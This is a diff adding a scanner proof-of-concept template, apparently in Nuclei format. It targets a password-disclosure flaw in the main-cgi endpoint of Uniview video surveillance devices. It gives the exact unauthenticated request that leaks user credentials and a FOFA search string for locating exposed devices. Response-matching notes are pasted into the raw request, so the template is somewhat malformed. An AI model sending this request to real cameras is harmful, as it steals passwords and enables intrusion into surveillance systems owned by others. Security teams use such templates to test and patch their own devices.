@@ -1,0 +1,40 @@
+id: poc-fz4nx397m26lsmuc
+info:
+  name: 宇视科技视频监控main-cgi密码泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fz4nx397m26lsmuc'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fz4nx397m26lsmuc
+    fofa: app="uniview-视频监控"
+http:
+- raw:
+  - 'GET /cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1} HTTP/1.1
+
+
+    Connection: close
+
+
+    Accept-Encoding: gzip
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    UserName
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
